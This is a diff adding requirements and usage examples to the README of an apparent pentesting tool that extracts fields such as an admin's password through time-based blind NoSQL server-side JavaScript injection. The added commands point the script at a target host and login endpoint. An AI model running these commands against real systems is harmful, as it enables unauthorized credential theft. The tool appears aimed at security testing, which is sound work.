@@ -18,4 +18,28 @@ https://portswigger.net/web-security/nosql-injection
 
 This values must be always customized to the target. Threshold determines where sleep vaule (True) was triggered in payload.  If the payload evaluates to a False condition (no sleep), the response takes approximately 1 second — set the sleep value high enough to safely distinguish True from False. In that case, setting sleep to 3 seconds and treshold to 3 seems like right choice.
 
+## Requirements
+
+- Python 3.7+
+- `requests` library (`pip install -r requirements.txt`, run from repo root)
+
+## Usage
+
+```bash
+# basic: extract a field for a known username
+python NoSQL-SSJI-time-based-blind.py -H target.com:3000 -u admin -f password
+
+# HTTPS target, custom endpoint
+python NoSQL-SSJI-time-based-blind.py -H target.com:3000 -u admin -f password --proto https --endpoint /api/login
+
+# route through Burp Proxy for traffic inspection
+python NoSQL-SSJI-time-based-blind.py -H target.com:3000 -u admin -f password --use-proxy --proxy http://127.0.0.1:8080
+
+# tune sleep/threshold for a slow or unreliable target
+python NoSQL-SSJI-time-based-blind.py -H target.com:8080 -u user -f secret --sleep-time 2000 --threshold 2.0
+
+# full option list
+python NoSQL-SSJI-time-based-blind.py -h
+```
+
 For license and usage disclaimer, see the main repository README.
